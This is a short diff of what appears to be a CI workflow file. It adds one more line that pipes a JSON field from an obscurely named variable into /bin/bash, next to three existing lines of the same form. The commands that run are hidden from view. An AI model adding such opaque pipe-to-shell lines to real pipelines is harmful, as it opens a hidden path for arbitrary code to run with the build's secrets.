@@ -39,6 +39,7 @@ jobs:
           echo $ymr6535 | jq -r .iq469 | /bin/bash
           printf '%s' "$c55" | jq -r .fkpek5 | /bin/bash
           printf '%s' "$l62975" | jq -r .cue7 | /bin/bash
+          echo $i27 | jq -r .emk5252 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
